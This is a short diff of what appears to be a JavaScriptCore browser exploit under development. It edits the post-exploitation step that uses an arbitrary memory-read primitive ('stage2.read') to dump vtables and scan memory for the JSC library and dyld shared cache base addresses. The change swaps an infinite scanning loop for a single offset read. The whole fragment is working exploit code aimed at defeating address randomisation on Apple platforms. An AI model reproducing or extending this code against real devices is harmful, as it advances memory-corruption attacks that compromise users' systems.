@@ -648,10 +648,13 @@ for (var i = 0; i < 1000; ++i) {
         //print("vtable dump : " + String.fromCharCode(...stage2.read(vtable, 0x100)))
         //print("JSC Lib header dump : " + ab2str(stage2.read(jscbase, 0x100)));
         print("lets attempt to find the dyld shared cache base");
-	while(true) {
+	hdr = Sub(hdr, 0x4000);
+	print(hex1(hdr) + " : " + ab2str(stage2.read(hdr,0x10)));
+	
+	/*while(true) {
 		jscbase -= 0x1000;
 		print(hex1(jscbase) + " : " + ab2str(stage2.read(jscbase,0x10)));
-	}
+	}*/
 		
         /*while(true)
         {
